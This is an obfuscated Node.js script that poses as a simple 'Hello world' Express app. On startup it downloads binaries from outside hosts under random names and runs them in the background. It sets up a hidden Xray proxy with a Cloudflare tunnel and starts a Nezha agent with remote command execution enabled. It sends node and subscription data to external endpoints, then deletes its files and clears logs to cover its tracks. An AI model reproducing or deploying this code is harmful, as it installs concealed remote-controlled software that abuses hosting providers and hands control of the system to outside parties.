const _0x42b52c=_0x3855;(function(_0x1f3478,_0x57e61d){const _0x27d1d4=_0x3855,_0x3e90d3=_0x1f3478();while(!![]){try{const _0x36cb32=parseInt(_0x27d1d4(0x181))/0x1*(-parseInt(_0x27d1d4(0x13a))/0x2)+parseInt(_0x27d1d4(0x108))/0x3*(-parseInt(_0x27d1d4(0x150))/0x4)+parseInt(_0x27d1d4(0x137))/0x5*(parseInt(_0x27d1d4(0x1bc))/0x6)+-parseInt(_0x27d1d4(0x134))/0x7*(-parseInt(_0x27d1d4(0x11a))/0x8)+parseInt(_0x27d1d4(0x1c2))/0x9+-parseInt(_0x27d1d4(0x1c1))/0xa*(parseInt(_0x27d1d4(0x1bb))/0xb)+parseInt(_0x27d1d4(0x198))/0xc*(parseInt(_0x27d1d4(0x112))/0xd);if(_0x36cb32===_0x57e61d)break;else _0x3e90d3['push'](_0x3e90d3['shift']());}catch(_0x8d583f){_0x3e90d3['push'](_0x3e90d3['shift']());}}}(_0x5319,0xa351b));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x42b52c(0x15d)),{promisify}=require(_0x42b52c(0x135)),exec=promisify(require(_0x42b52c(0x162))[_0x42b52c(0x18d)]),{execSync}=require(_0x42b52c(0x162)),UPLOAD_URL=process[_0x42b52c(0x19a)][_0x42b52c(0x12b)]||'',PROJECT_URL=process['env'][_0x42b52c(0x153)]||'',AUTO_ACCESS=process[_0x42b52c(0x19a)][_0x42b52c(0x1c5)]||![],FILE_PATH=process[_0x42b52c(0x19a)]['FILE_PATH']||_0x42b52c(0x16b),SUB_PATH=process[_0x42b52c(0x19a)]['SUB_PATH']||'sub',PORT=process['env'][_0x42b52c(0x13b)]||process[_0x42b52c(0x19a)][_0x42b52c(0x110)]||0xbb8,UUID=process[_0x42b52c(0x19a)][_0x42b52c(0x1ac)]||_0x42b52c(0x1ae),NEZHA_SERVER=process['env'][_0x42b52c(0x195)]||'',NEZHA_PORT=process[_0x42b52c(0x19a)][_0x42b52c(0x16e)]||'',NEZHA_KEY=process[_0x42b52c(0x19a)][_0x42b52c(0x1a2)]||'',ARGO_DOMAIN=process[_0x42b52c(0x19a)][_0x42b52c(0x166)]||'',ARGO_AUTH=process[_0x42b52c(0x19a)][_0x42b52c(0x130)]||'',ARGO_PORT=process[_0x42b52c(0x19a)][_0x42b52c(0x10f)]||0x1f41,CFIP=process[_0x42b52c(0x19a)][_0x42b52c(0x11c)]||_0x42b52c(0x1a8),CFPORT=process[_0x42b52c(0x19a)]['CFPORT']||0x1bb,NAME=process['env'][_0x42b52c(0x165)]||'';!fs[_0x42b52c(0x191)](FILE_PATH)?(fs[_0x42b52c(0x1ba)](FILE_PATH),console[_0x42b52c(0x1b6)](FILE_PATH+_0x42b52c(0x15a))):console[_0x42b52c(0x1b6)](FILE_PATH+_0x42b52c(0x173));function generateRandomName(){const _0x4b10c7=_0x42b52c,_0x3b058c=_0x4b10c7(0x197);let _0x6dd190='';for(let _0x20160f=0x0;_0x20160f<0x6;_0x20160f++){_0x6dd190+=_0x3b058c[_0x4b10c7(0x123)](Math[_0x4b10c7(0x172)](Math['random']()*_0x3b058c[_0x4b10c7(0x1a7)]));}return _0x6dd190;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x42b52c(0x154)](FILE_PATH,npmName),phpPath=path[_0x42b52c(0x154)](FILE_PATH,phpName),webPath=path[_0x42b52c(0x154)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x42b52c(0x154)](FILE_PATH,'sub.txt'),listPath=path[_0x42b52c(0x154)](FILE_PATH,_0x42b52c(0x118)),bootLogPath=path[_0x42b52c(0x154)](FILE_PATH,_0x42b52c(0x131)),configPath=path[_0x42b52c(0x154)](FILE_PATH,'config.json');function deleteNodes(){const _0x114a57=_0x42b52c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x40f439;try{_0x40f439=fs[_0x114a57(0x1b7)](subPath,'utf-8');}catch{return null;}const _0xc6a8c5=Buffer[_0x114a57(0x1af)](_0x40f439,_0x114a57(0x1a1))[_0x114a57(0x113)]('utf-8'),_0x17b520=_0xc6a8c5[_0x114a57(0x16c)]('\x0a')[_0x114a57(0x18e)](_0x4c4200=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4c4200));if(_0x17b520[_0x114a57(0x1a7)]===0x0)return;return axios[_0x114a57(0x15c)](UPLOAD_URL+_0x114a57(0x13d),JSON[_0x114a57(0x1c3)]({'nodes':_0x17b520}),{'headers':{'Content-Type':_0x114a57(0x182)}})['catch'](_0x4c0a24=>{return null;}),null;}catch(_0x1221e7){return null;}}function _0x3855(_0x15e35b,_0x1a1fad){const _0x5319e4=_0x5319();return _0x3855=function(_0x385570,_0x2206c9){_0x385570=_0x385570-0x107;let _0x16b02a=_0x5319e4[_0x385570];return _0x16b02a;},_0x3855(_0x15e35b,_0x1a1fad);}function cleanupOldFiles(){const _0x340a5d=_0x42b52c;try{const _0x392f0c=fs[_0x340a5d(0x14d)](FILE_PATH);_0x392f0c[_0x340a5d(0x14e)](_0x28c8eb=>{const _0x44b9cc=_0x340a5d,_0xdde018=path[_0x44b9cc(0x154)](FILE_PATH,_0x28c8eb);try{const _0x4012a0=fs['statSync'](_0xdde018);_0x4012a0['isFile']()&&fs[_0x44b9cc(0x1bf)](_0xdde018);}catch(_0x22643d){}});}catch(_0x4d9420){}}app['get']('/',function(_0x3a204b,_0x269e71){const _0x45cbbe=_0x42b52c;_0x269e71[_0x45cbbe(0x1c4)](_0x45cbbe(0x1c0));});async function generateConfig(){const _0x50a493=_0x42b52c,_0x5232ed={'log':{'access':'/dev/null','error':_0x50a493(0x12c),'loglevel':_0x50a493(0x180)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x50a493(0x18b),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x50a493(0x180),'fallbacks':[{'dest':0xbb9},{'path':_0x50a493(0x14c),'dest':0xbba},{'path':_0x50a493(0x17c),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x50a493(0x159)}},{'port':0xbb9,'listen':_0x50a493(0x17a),'protocol':_0x50a493(0x18b),'settings':{'clients':[{'id':UUID}],'decryption':_0x50a493(0x180)},'streamSettings':{'network':_0x50a493(0x159),'security':_0x50a493(0x180)}},{'port':0xbba,'listen':_0x50a493(0x17a),'protocol':_0x50a493(0x18b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x50a493(0x180)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x50a493(0x14c)}},'sniffing':{'enabled':!![],'destOverride':[_0x50a493(0x14f),_0x50a493(0x1ad),_0x50a493(0x10b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x50a493(0x17a),'protocol':_0x50a493(0x11f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x50a493(0x1ad),_0x50a493(0x10b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x50a493(0x17a),'protocol':_0x50a493(0x109),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x50a493(0x12f)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x50a493(0x1ad),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x50a493(0x1a3)]},'outbounds':[{'protocol':_0x50a493(0x10c),'tag':_0x50a493(0x1b8)},{'protocol':_0x50a493(0x1a4),'tag':_0x50a493(0x185)}]};fs[_0x50a493(0x11b)](path[_0x50a493(0x154)](FILE_PATH,'config.json'),JSON[_0x50a493(0x1c3)](_0x5232ed,null,0x2));}function getSystemArchitecture(){const _0x33d351=_0x42b52c,_0xcc10c6=os[_0x33d351(0x12a)]();return _0xcc10c6==='arm'||_0xcc10c6===_0x33d351(0x11d)||_0xcc10c6==='aarch64'?'arm':_0x33d351(0x143);}function downloadFile(_0x30795f,_0x5091b2,_0x4ea443){const _0x2a1776=_0x42b52c,_0x2991aa=_0x30795f;!fs[_0x2a1776(0x191)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2ddc0d=fs['createWriteStream'](_0x2991aa);axios({'method':'get','url':_0x5091b2,'responseType':'stream'})[_0x2a1776(0x128)](_0x30abd6=>{const _0x5a0cec=_0x2a1776;_0x30abd6[_0x5a0cec(0x133)]['pipe'](_0x2ddc0d),_0x2ddc0d['on'](_0x5a0cec(0x122),()=>{const _0x377c5b=_0x5a0cec;_0x2ddc0d['close'](),console[_0x377c5b(0x1b6)](_0x377c5b(0x1c7)+path['basename'](_0x2991aa)+_0x377c5b(0x1aa)),_0x4ea443(null,_0x2991aa);}),_0x2ddc0d['on'](_0x5a0cec(0x13e),_0x4aa7a9=>{const _0x3255a0=_0x5a0cec;fs['unlink'](_0x2991aa,()=>{});const _0x579ae5=_0x3255a0(0x1c7)+path[_0x3255a0(0x147)](_0x2991aa)+'\x20failed:\x20'+_0x4aa7a9[_0x3255a0(0x142)];console['error'](_0x579ae5),_0x4ea443(_0x579ae5);});})['catch'](_0xcf10ff=>{const _0x5b9b0f=_0x2a1776,_0x7012f4=_0x5b9b0f(0x1c7)+path[_0x5b9b0f(0x147)](_0x2991aa)+_0x5b9b0f(0x148)+_0xcf10ff['message'];console[_0x5b9b0f(0x13e)](_0x7012f4),_0x4ea443(_0x7012f4);});}async function downloadFilesAndRun(){const _0x8be0fa=_0x42b52c,_0x4b7f4c=getSystemArchitecture(),_0x29c7f2=getFilesForArchitecture(_0x4b7f4c);if(_0x29c7f2[_0x8be0fa(0x1a7)]===0x0){console[_0x8be0fa(0x1b6)](_0x8be0fa(0x1b4));return;}const _0xda844c=_0x29c7f2['map'](_0x40ac42=>{return new Promise((_0x50fc85,_0x11ca1c)=>{const _0x103544=_0x3855;downloadFile(_0x40ac42[_0x103544(0x186)],_0x40ac42[_0x103544(0x1be)],(_0x3c132e,_0xe820dc)=>{_0x3c132e?_0x11ca1c(_0x3c132e):_0x50fc85(_0xe820dc);});});});try{await Promise[_0x8be0fa(0x14b)](_0xda844c);}catch(_0x29ed55){console[_0x8be0fa(0x13e)](_0x8be0fa(0x1a6),_0x29ed55);return;}function _0x36e40a(_0x2d4a05){const _0x28571c=_0x8be0fa,_0x46f2db=0x1fd;_0x2d4a05[_0x28571c(0x14e)](_0x54a8f3=>{const _0x1868c1=_0x28571c;fs['existsSync'](_0x54a8f3)&&fs[_0x1868c1(0x13f)](_0x54a8f3,_0x46f2db,_0x4282e0=>{const _0x2e93b7=_0x1868c1;_0x4282e0?console[_0x2e93b7(0x13e)](_0x2e93b7(0x10d)+_0x54a8f3+':\x20'+_0x4282e0):console[_0x2e93b7(0x1b6)](_0x2e93b7(0x17e)+_0x54a8f3+':\x20'+_0x46f2db[_0x2e93b7(0x113)](0x8));});});}const _0x5ec1b6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x36e40a(_0x5ec1b6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5a1b69=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x8be0fa(0x16c)](':')['pop']():'',_0x501bac=new Set([_0x8be0fa(0x194),_0x8be0fa(0x157),_0x8be0fa(0x1b5),_0x8be0fa(0x199),_0x8be0fa(0x16f),_0x8be0fa(0x190)]),_0x286d24=_0x501bac['has'](_0x5a1b69)?_0x8be0fa(0x167):_0x8be0fa(0x1c6),_0x225ae0=_0x8be0fa(0x155)+NEZHA_KEY+_0x8be0fa(0x188)+NEZHA_SERVER+_0x8be0fa(0x18a)+_0x286d24+_0x8be0fa(0x170)+UUID;fs[_0x8be0fa(0x11b)](path[_0x8be0fa(0x154)](FILE_PATH,'config.yaml'),_0x225ae0);const _0x1d752f='nohup\x20'+phpPath+_0x8be0fa(0x139)+FILE_PATH+_0x8be0fa(0x15b);try{await exec(_0x1d752f),console[_0x8be0fa(0x1b6)](phpName+_0x8be0fa(0x141)),await new Promise(_0x921b74=>setTimeout(_0x921b74,0x3e8));}catch(_0x190915){console['error'](_0x8be0fa(0x19f)+_0x190915);}}else{let _0x21aa69='';const _0x436cca=[_0x8be0fa(0x194),_0x8be0fa(0x157),_0x8be0fa(0x1b5),'2087',_0x8be0fa(0x16f),_0x8be0fa(0x190)];_0x436cca[_0x8be0fa(0x18c)](NEZHA_PORT)&&(_0x21aa69=_0x8be0fa(0x176));const _0x52ecbf='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x21aa69+_0x8be0fa(0x164);try{await exec(_0x52ecbf),console[_0x8be0fa(0x1b6)](npmName+_0x8be0fa(0x141)),await new Promise(_0x165ca1=>setTimeout(_0x165ca1,0x3e8));}catch(_0x5bb07a){console[_0x8be0fa(0x13e)](_0x8be0fa(0x120)+_0x5bb07a);}}}else console['log'](_0x8be0fa(0x15e));const _0x44bf6d='nohup\x20'+webPath+_0x8be0fa(0x1b3)+FILE_PATH+_0x8be0fa(0x111);try{await exec(_0x44bf6d),console[_0x8be0fa(0x1b6)](webName+_0x8be0fa(0x141)),await new Promise(_0x11e4ea=>setTimeout(_0x11e4ea,0x3e8));}catch(_0x39156e){console[_0x8be0fa(0x13e)]('web\x20running\x20error:\x20'+_0x39156e);}if(fs['existsSync'](botPath)){let _0x1c77b4;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1c77b4=_0x8be0fa(0x126)+ARGO_AUTH;else ARGO_AUTH[_0x8be0fa(0x171)](/TunnelSecret/)?_0x1c77b4=_0x8be0fa(0x18f)+FILE_PATH+_0x8be0fa(0x1b2):_0x1c77b4=_0x8be0fa(0x16d)+FILE_PATH+_0x8be0fa(0x149)+ARGO_PORT;try{await exec(_0x8be0fa(0x1a5)+botPath+'\x20'+_0x1c77b4+_0x8be0fa(0x175)),console['log'](botName+_0x8be0fa(0x141)),await new Promise(_0x3a5b38=>setTimeout(_0x3a5b38,0x7d0));}catch(_0x15d870){console[_0x8be0fa(0x13e)](_0x8be0fa(0x187)+_0x15d870);}}await new Promise(_0x35216c=>setTimeout(_0x35216c,0x1388));}function getFilesForArchitecture(_0x151159){const _0x3d7930=_0x42b52c;let _0x5dd4a7;_0x151159===_0x3d7930(0x127)?_0x5dd4a7=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3d7930(0x158)}]:_0x5dd4a7=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3d7930(0x136)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3c6116=_0x151159===_0x3d7930(0x127)?'https://arm64.ssss.nyc.mn/agent':_0x3d7930(0x184);_0x5dd4a7['unshift']({'fileName':npmPath,'fileUrl':_0x3c6116});}else{const _0x42b129=_0x151159==='arm'?_0x3d7930(0x138):_0x3d7930(0x163);_0x5dd4a7[_0x3d7930(0x174)]({'fileName':phpPath,'fileUrl':_0x42b129});}}return _0x5dd4a7;}function argoType(){const _0x2ddabc=_0x42b52c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2ddabc(0x1b6)](_0x2ddabc(0x132));return;}if(ARGO_AUTH[_0x2ddabc(0x18c)](_0x2ddabc(0x193))){fs[_0x2ddabc(0x11b)](path['join'](FILE_PATH,_0x2ddabc(0x16a)),ARGO_AUTH);const _0x41ed4b='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x2ddabc(0x146)+path[_0x2ddabc(0x154)](FILE_PATH,'tunnel.json')+_0x2ddabc(0x151)+ARGO_DOMAIN+_0x2ddabc(0x192)+ARGO_PORT+_0x2ddabc(0x125);fs[_0x2ddabc(0x11b)](path[_0x2ddabc(0x154)](FILE_PATH,_0x2ddabc(0x17b)),_0x41ed4b);}else console[_0x2ddabc(0x1b6)](_0x2ddabc(0x169));}argoType();function _0x5319(){const _0x23bb30=['log','readFileSync','direct','Unhandled\x20error\x20in\x20startserver:','mkdirSync','539ywAvEg','486kvgJTT','&path=%2Fvless-argo%3Fed%3D2560#','fileUrl','unlinkSync','Hello\x20world!','60530OZETly','7680177vEduRZ','stringify','send','AUTO_ACCESS','false','Download\x20','Error\x20reading\x20boot.log:','2354757vFAbTl','trojan','/api/add-nodes','quic','freedom','Empowerment\x20failed\x20for\x20','&fp=firefox&type=ws&host=','ARGO_PORT','PORT','/config.json\x20>/dev/null\x202>&1\x20&','1742AfyPBN','toString','\x20>/dev/null\x202>&1','trim','Skipping\x20adding\x20automatic\x20access\x20task','response','list.txt','?encryption=none&security=tls&sni=','6913352ywCUyz','writeFileSync','CFIP','arm64','Subscription\x20uploaded\x20successfully','vmess','npm\x20running\x20error:\x20','platform','finish','charAt','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','arm','then','utf-8','arch','UPLOAD_URL','/dev/null','ARGO_DOMAIN:','clear','/trojan-argo','ARGO_AUTH','boot.log','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','data','7MetEBp','util','https://amd64.ssss.nyc.mn/bot','47890BkDlZz','https://arm64.ssss.nyc.mn/v1','\x20-c\x20\x22','6LWUIvu','SERVER_PORT','win32','/api/delete-nodes','error','chmod','\x0avless://','\x20is\x20running','message','amd','automatic\x20access\x20task\x20added\x20successfully','Nodes\x20uploaded\x20successfully','\x0a\x20\x20credentials-file:\x20','basename','\x20failed:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','all','/vless-argo','readdirSync','forEach','http','4iUAACg','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','PROJECT_URL','join','\x0aclient_secret:\x20','push','8443','https://arm64.ssss.nyc.mn/bot','tcp','\x20is\x20created','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','post','path','NEZHA\x20variable\x20is\x20empty,skip\x20running','ArgoDomain:','/api/add-subscriptions','rm\x20-rf\x20','child_process','https://amd64.ssss.nyc.mn/v1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NAME','ARGO_DOMAIN','true','\x0a\x20\x20\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel.json','./tmp','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','NEZHA_PORT','2083','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','match','floor','\x20already\x20exists','unshift','\x20>/dev/null\x202>&1\x20&','--tls','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','del\x20/f\x20/q\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','127.0.0.1','tunnel.yml','/vmess-argo','\x20>\x20nul\x202>&1','Empowerment\x20success\x20for\x20','taskkill\x20/f\x20/im\x20','none','325343gtCwwg','application/json','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/agent','block','fileName','Error\x20executing\x20command:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','pkill\x20-f\x20\x22[','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vless','includes','exec','filter','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2053','existsSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','TunnelSecret','443','NEZHA_SERVER','Content-Type','abcdefghijklmnopqrstuvwxyz','20880XOprNT','2087','env','get','test','App\x20is\x20running','Error\x20in\x20startserver:','php\x20running\x20error:\x20','\x0a\x20\x20\x0atrojan://','base64','NEZHA_KEY','https+local://8.8.8.8/dns-query','blackhole','nohup\x20','Error\x20downloading\x20files:','length','cdns.doon.eu.org','status','\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','UUID','tls','4e510133-b9e0-40c3-85b6-7e1aef404e72','from','/vmess-argo?ed=2560','listen','/tunnel.yml\x20run','\x20-c\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2096'];_0x5319=function(){return _0x23bb30;};return _0x5319();}async function extractDomains(){const _0x13e61a=_0x42b52c;let _0x3ffd48;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3ffd48=ARGO_DOMAIN,console['log'](_0x13e61a(0x12d),_0x3ffd48),await _0x4f6e06(_0x3ffd48);else try{const _0xebc3d=fs[_0x13e61a(0x1b7)](path[_0x13e61a(0x154)](FILE_PATH,'boot.log'),_0x13e61a(0x129)),_0x460d7f=_0xebc3d[_0x13e61a(0x16c)]('\x0a'),_0x4736d0=[];_0x460d7f[_0x13e61a(0x14e)](_0x2ee624=>{const _0x20a8bb=_0x13e61a,_0x10e8c5=_0x2ee624[_0x20a8bb(0x171)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x10e8c5){const _0x3d24e5=_0x10e8c5[0x1];_0x4736d0['push'](_0x3d24e5);}});if(_0x4736d0['length']>0x0)_0x3ffd48=_0x4736d0[0x0],console['log'](_0x13e61a(0x15f),_0x3ffd48),await _0x4f6e06(_0x3ffd48);else{console[_0x13e61a(0x1b6)](_0x13e61a(0x14a)),fs[_0x13e61a(0x1bf)](path[_0x13e61a(0x154)](FILE_PATH,_0x13e61a(0x131)));async function _0x4cb0bd(){const _0x4fd1e6=_0x13e61a;try{process[_0x4fd1e6(0x121)]==='win32'?await exec(_0x4fd1e6(0x17f)+botName+_0x4fd1e6(0x124)):await exec(_0x4fd1e6(0x189)+botName[_0x4fd1e6(0x123)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x107b40){}}_0x4cb0bd(),await new Promise(_0x1d61ca=>setTimeout(_0x1d61ca,0xbb8));const _0x27118c=_0x13e61a(0x16d)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x13e61a(0x1a5)+botPath+'\x20'+_0x27118c+_0x13e61a(0x175)),console[_0x13e61a(0x1b6)](botName+_0x13e61a(0x141)),await new Promise(_0x3f336c=>setTimeout(_0x3f336c,0xbb8)),await extractDomains();}catch(_0x1e933c){console[_0x13e61a(0x13e)]('Error\x20executing\x20command:\x20'+_0x1e933c);}}}catch(_0x3ac223){console[_0x13e61a(0x13e)](_0x13e61a(0x107),_0x3ac223);}async function _0x4f6e06(_0x4b11f6){const _0x361c99=_0x13e61a,_0x3281cc=execSync(_0x361c99(0x177),{'encoding':_0x361c99(0x129)}),_0xa7f53a=_0x3281cc[_0x361c99(0x115)](),_0x4773f0=NAME?NAME+'-'+_0xa7f53a:_0xa7f53a;return new Promise(_0x16efa3=>{setTimeout(()=>{const _0x152e80=_0x3855,_0x5ec5eb={'v':'2','ps':''+_0x4773f0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x152e80(0x180),'net':'ws','type':_0x152e80(0x180),'host':_0x4b11f6,'path':_0x152e80(0x1b0),'tls':_0x152e80(0x1ad),'sni':_0x4b11f6,'alpn':'','fp':'firefox'},_0x39f53f=_0x152e80(0x140)+UUID+'@'+CFIP+':'+CFPORT+_0x152e80(0x119)+_0x4b11f6+_0x152e80(0x10e)+_0x4b11f6+_0x152e80(0x1bd)+_0x4773f0+'\x0a\x20\x20\x0avmess://'+Buffer[_0x152e80(0x1af)](JSON[_0x152e80(0x1c3)](_0x5ec5eb))['toString']('base64')+_0x152e80(0x1a0)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x4b11f6+'&fp=firefox&type=ws&host='+_0x4b11f6+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4773f0+_0x152e80(0x168);console[_0x152e80(0x1b6)](Buffer[_0x152e80(0x1af)](_0x39f53f)[_0x152e80(0x113)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x152e80(0x1af)](_0x39f53f)[_0x152e80(0x113)](_0x152e80(0x1a1))),console[_0x152e80(0x1b6)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x152e80(0x19b)]('/'+SUB_PATH,(_0x216c84,_0x3276ce)=>{const _0x3e0ce3=_0x152e80,_0x3b9454=Buffer[_0x3e0ce3(0x1af)](_0x39f53f)['toString']('base64');_0x3276ce['set'](_0x3e0ce3(0x196),_0x3e0ce3(0x183)),_0x3276ce[_0x3e0ce3(0x1c4)](_0x3b9454);}),_0x16efa3(_0x39f53f);},0x7d0);});}}async function uploadNodes(){const _0x22df78=_0x42b52c;if(UPLOAD_URL&&PROJECT_URL){const _0x53fb4a=PROJECT_URL+'/'+SUB_PATH,_0x1c6493={'subscription':[_0x53fb4a]};try{const _0x20b582=await axios[_0x22df78(0x15c)](UPLOAD_URL+_0x22df78(0x160),_0x1c6493,{'headers':{'Content-Type':_0x22df78(0x182)}});return _0x20b582&&_0x20b582['status']===0xc8?(console[_0x22df78(0x1b6)](_0x22df78(0x11e)),_0x20b582):null;}catch(_0x46e3c9){if(_0x46e3c9['response']){if(_0x46e3c9[_0x22df78(0x117)][_0x22df78(0x1a9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x22df78(0x191)](listPath))return;const _0xa2ee88=fs[_0x22df78(0x1b7)](listPath,_0x22df78(0x129)),_0x44d3e9=_0xa2ee88[_0x22df78(0x16c)]('\x0a')[_0x22df78(0x18e)](_0x1efd25=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x22df78(0x19c)](_0x1efd25));if(_0x44d3e9['length']===0x0)return;const _0x480c2e=JSON[_0x22df78(0x1c3)]({'nodes':_0x44d3e9});try{const _0x3f1969=await axios[_0x22df78(0x15c)](UPLOAD_URL+_0x22df78(0x10a),_0x480c2e,{'headers':{'Content-Type':_0x22df78(0x182)}});return _0x3f1969&&_0x3f1969[_0x22df78(0x1a9)]===0xc8?(console['log'](_0x22df78(0x145)),_0x3f1969):null;}catch(_0x483a49){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x17ade7=_0x3855,_0x1b9aa5=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1b9aa5[_0x17ade7(0x156)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1b9aa5[_0x17ade7(0x156)](phpPath);process['platform']===_0x17ade7(0x13c)?exec(_0x17ade7(0x178)+_0x1b9aa5['join']('\x20')+_0x17ade7(0x17d),_0x52a679=>{const _0x4fe04d=_0x17ade7;console[_0x4fe04d(0x12e)](),console['log'](_0x4fe04d(0x19d)),console[_0x4fe04d(0x1b6)](_0x4fe04d(0x179));}):exec(_0x17ade7(0x161)+_0x1b9aa5[_0x17ade7(0x154)]('\x20')+_0x17ade7(0x114),_0x2e3f59=>{const _0x13a578=_0x17ade7;console[_0x13a578(0x12e)](),console[_0x13a578(0x1b6)]('App\x20is\x20running'),console['log'](_0x13a578(0x179));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x39cb2a=_0x42b52c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x39cb2a(0x1b6)](_0x39cb2a(0x116));return;}try{const _0x1ab24d=await axios[_0x39cb2a(0x15c)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x39cb2a(0x144)),_0x1ab24d;}catch(_0x379df2){return console['error'](_0x39cb2a(0x152)+_0x379df2['message']),null;}}async function startserver(){const _0x1be911=_0x42b52c;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5926a8){console['error'](_0x1be911(0x19e),_0x5926a8);}}startserver()['catch'](_0xfdde0c=>{const _0x28f9a7=_0x42b52c;console[_0x28f9a7(0x13e)](_0x28f9a7(0x1b9),_0xfdde0c);}),app[_0x42b52c(0x1b1)](PORT,()=>console[_0x42b52c(0x1b6)](_0x42b52c(0x1ab)+PORT+'!'));
